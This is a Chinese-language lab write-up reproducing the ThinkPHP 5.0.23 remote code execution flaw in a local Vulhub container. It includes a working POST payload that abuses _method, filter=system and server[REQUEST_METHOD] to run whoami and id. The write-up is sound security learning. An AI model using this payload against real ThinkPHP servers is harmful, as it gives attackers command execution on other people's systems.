# ThinkPHP 5.0.23 RCE 漏洞复现

> ThinkPHP 5.0.23 远程代码执行漏洞本地复现与分析

## 1. 项目简介

本项目用于学习 Web 安全漏洞复现。

通过 Docker + Vulhub 搭建 ThinkPHP 5.0.23 本地测试环境，
使用 Burp Suite 对 HTTP 请求进行抓取和修改，完成漏洞复现。

本次实验在本地隔离环境中进行，并通过 `whoami` 和 `id`
验证命令执行结果。

## 2. 实验环境

| 项目 | 环境 |
|---|---|
| 操作系统 | Windows |
| 靶场 | Vulhub |
| 容器 | Docker |
| Web 框架 | ThinkPHP 5.0.23 |
| Web 服务器 | Apache 2.4.25 |
| PHP | PHP 7.2.12 |
| 测试工具 | Burp Suite |
| 浏览器 | Chromium |

## 3. 漏洞复现

### 3.1 搭建靶场

使用 Vulhub 搭建 ThinkPHP 5.0.23 本地 Docker 环境。

靶场启动后，通过浏览器访问：

```text
http://localhost:8080
```

确认 Web 应用能够正常访问。

### 3.2 构造请求

使用 Burp Suite 拦截并修改 HTTP 请求。

实验中使用 POST 请求进行验证：

```http
POST /index.php?s=captcha HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded
Connection: close

_method=__construct&filter=system&method=get&server[REQUEST_METHOD]=whoami
```

### 3.3 命令执行验证

发送请求后，服务器返回：

```text
www-data
```

说明命令已经在 Web 服务进程权限下执行。

![whoami result](screenshots/03-burp-whoami.png)

### 3.4 权限信息验证

进一步将执行参数修改为：

```text
server[REQUEST_METHOD]=id
```

通过 `id` 查看当前 Web 服务进程的用户及用户组信息。

![id result](screenshots/04-burp-id.png)

## 4. 漏洞原理

本次漏洞与 ThinkPHP 请求参数处理及动态调用机制有关。

攻击者通过构造特定请求参数，使用户可控数据影响框架内部的请求处理过程，并最终调用危险函数执行攻击者控制的命令。

关键参数包括：

```text
_method=__construct
filter=system
method=get
server[REQUEST_METHOD]=whoami
```

其中：

- `_method`：参与 ThinkPHP 请求方法相关处理；
- `filter`：指定后续数据处理使用的过滤器；
- `method`：用于指定请求方法相关参数；
- `server[REQUEST_METHOD]`：提供命令执行时使用的参数。

最终通过 `system` 执行指定命令。

## 5. 实验结果

在本地 Vulhub 靶场中成功复现命令执行。

验证结果：

```text
whoami
↓
www-data
```

并进一步使用 `id` 对当前 Web 服务进程权限进行了验证。

本次实验验证的是 Web 服务账户权限下的命令执行，并未获取宿主机或 root 权限。

## 6. 学习内容

通过本次实验学习了：

- Docker 靶场环境搭建
- Vulhub 的基本使用
- Burp Suite HTTP 请求抓取与修改
- Web 漏洞复现流程
- HTTP POST 请求分析
- ThinkPHP 请求参数处理
- Linux Web 服务进程权限分析
- 
